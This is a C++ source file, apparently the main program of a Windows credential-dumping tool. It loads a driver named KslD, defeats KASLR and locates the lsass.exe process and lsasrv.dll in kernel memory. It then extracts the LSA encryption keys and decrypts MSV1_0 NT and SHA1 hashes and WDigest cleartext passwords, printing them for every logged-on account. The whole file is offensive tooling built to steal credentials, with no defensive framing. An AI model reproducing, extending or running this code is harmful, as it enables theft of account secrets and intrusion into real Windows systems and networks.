#include "lsa.h"
#include "wdigest.h"
#include <winreg.h>
#include <cstdio>
#include <set>
#include <tuple>

static uint32_t get_build_number() {
    HKEY hk = nullptr;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hk);
    if (!hk) throw std::runtime_error("Cannot read build number");
    wchar_t buf[32]{};
    DWORD size = sizeof(buf);
    RegQueryValueExW(hk, L"CurrentBuildNumber", nullptr, nullptr,
        reinterpret_cast<LPBYTE>(buf), &size);
    RegCloseKey(hk);
    return static_cast<uint32_t>(std::wcstoul(buf, nullptr, 10));
}

static bool is_elevated() {
    BOOL elevated = FALSE;
    HANDLE token = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elev{};
        DWORD sz = sizeof(elev);
        GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &sz);
        elevated = elev.TokenIsElevated;
        CloseHandle(token);
    }
    return elevated != FALSE;
}

static void print_separator() {
    std::cout << std::format("{:=<70}\n", "");
}

static int guarded_main();

int main() {
    std::cout.setf(std::ios::unitbuf);
    std::cerr.setf(std::ios::unitbuf);
    setvbuf(stdout, nullptr, _IONBF, 0);

    __try {
        return guarded_main();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DWORD code = GetExceptionCode();
        fprintf(stderr, "\n[-] SEH EXCEPTION: 0x%08lX", code);
        if (code == EXCEPTION_ACCESS_VIOLATION)
            fprintf(stderr, " (ACCESS_VIOLATION)");
        fprintf(stderr, "\n");
        return 1;
    }
}

static int guarded_main() {
    try {
        if (!is_elevated()) {
            std::cerr << "[-] Run as Administrator\n";
            return 1;
        }

        auto build = get_build_number();
        std::cout << std::format("[*] Windows Build {}\n", build);

        // ---- Driver setup ----
        std::cout << "[*] Setting up KslD driver...\n";
        auto state = setup_ksld();
        HANDLE h = state.handle.get();
        std::cout << "[+] Driver loaded\n";

        std::vector<Credential> msv_creds;
        std::vector<WDigestCredential> wd_creds;

        // Shared state from lsass discovery
        LsassInfo lsass{};
        LsaKeys keys{};
        bool have_keys = false;

        try {
            // ---- KASLR bypass ----
            std::cout << "[*] KASLR bypass (SubCmd 2)...\n";
            auto info = kaslr_bypass(h);
            std::cout << std::format("  ntoskrnl={:#x}\n", info.ntos_base);

            // ---- EPROCESS leak + lsass walk ----
            std::cout << "[*] Finding lsass.exe...\n";
            lsass = find_lsass(h);

            // ---- Find lsasrv.dll ----
            std::cout << "[*] Finding lsasrv.dll...\n";
            auto lsasrv = find_lsasrv(h, lsass.dtb, lsass.eprocess, lsass.peb_offset);

            // ---- LSA keys ----
            std::cout << "[*] Extracting LSA encryption keys...\n";
            keys = extract_lsa_keys(h, lsass.dtb, lsasrv.base, lsasrv.size);
            have_keys = true;
            std::cout << "  LSA keys found\n";

            // ---- Phase 1: MSV1_0 ----
            std::cout << "[*] Finding LogonSessionList...\n";
            auto logon = find_logon_list(h, lsass.dtb, lsasrv.base, lsasrv.size, build);

            std::cout << "[*] Extracting MSV1_0 credentials...\n";
            msv_creds = extract_creds(h, lsass.dtb, logon.list_ptr, logon.count, build, keys);

            // Deduplicate
            {
                std::set<std::tuple<std::wstring, std::wstring, std::string>> seen;
                std::vector<Credential> unique;
                for (auto& c : msv_creds) {
                    auto key = std::make_tuple(c.user, c.domain, c.nt_hash);
                    if (!seen.contains(key)) {
                        seen.insert(key);
                        unique.push_back(std::move(c));
                    }
                }
                msv_creds = std::move(unique);
            }

        } catch (const std::exception& e) {
            std::cerr << std::format("[-] MSV1_0 phase: {}\n", e.what());
        }

        // ---- Phase 2: WDigest ----
        if (have_keys) {
            try {
                std::cout << "[*] Checking WDigest...\n";
                wd_creds = extract_wdigest_creds(h, lsass.dtb,
                    lsass.eprocess, lsass.peb_offset, keys);

                // Deduplicate
                {
                    std::set<std::tuple<std::wstring, std::wstring, std::wstring>> seen;
                    std::vector<WDigestCredential> unique;
                    for (auto& c : wd_creds) {
                        auto key = std::make_tuple(c.user, c.domain, c.password);
                        if (!seen.contains(key)) {
                            seen.insert(key);
                            unique.push_back(std::move(c));
                        }
                    }
                    wd_creds = std::move(unique);
                }
            } catch (const std::exception& e) {
                std::cout << std::format("  WDigest: {}\n", e.what());
            }
        }

        // ---- Cleanup ----
        std::cout << "[*] Restoring driver configuration...\n";
        cleanup_ksld(state);

        // ---- Output ----
        std::cout << "\n";
        print_separator();
        std::cout << " MSV1_0 CREDENTIALS\n";
        print_separator();

        if (msv_creds.empty()) {
            std::cout << "[-] No MSV1_0 credentials extracted\n";
        } else {
            std::cout << std::format("[+] {} credential(s):\n\n", msv_creds.size());
            for (auto& c : msv_creds) {
                std::wcout << std::format(L"  {}\\{}\n", c.domain, c.user);
                std::cout  << std::format("    NT:   {}\n", c.nt_hash);
                if (!c.sha_hash.empty() && c.sha_hash != std::string(40, '0'))
                    std::cout << std::format("    SHA1: {}\n", c.sha_hash);
                std::cout << "\n";
            }
        }

        std::cout << "\n";
        print_separator();
        std::cout << " WDIGEST CREDENTIALS (Cleartext)\n";
        print_separator();
        if (wd_creds.empty()) {
            std::cout << "[-] No WDigest credentials (caching disabled or no logon since patch)\n";
        } else {
            std::cout << std::format("[+] {} credential(s):\n\n", wd_creds.size());
            for (auto& c : wd_creds) {
                std::wcout << std::format(L"  {}\\{}\n", c.domain, c.user);
                std::wcout << std::format(L"    Password: {}\n\n", c.password);
            }
        }

        print_separator();
        std::cout << std::format("[*] Total: {} MSV1_0, {} WDigest\n",
                                 msv_creds.size(), wd_creds.size());

    } catch (const std::exception& e) {
        std::cerr << std::format("\n[-] FATAL: {}\n", e.what());
        return 1;
    }
    return 0;
}
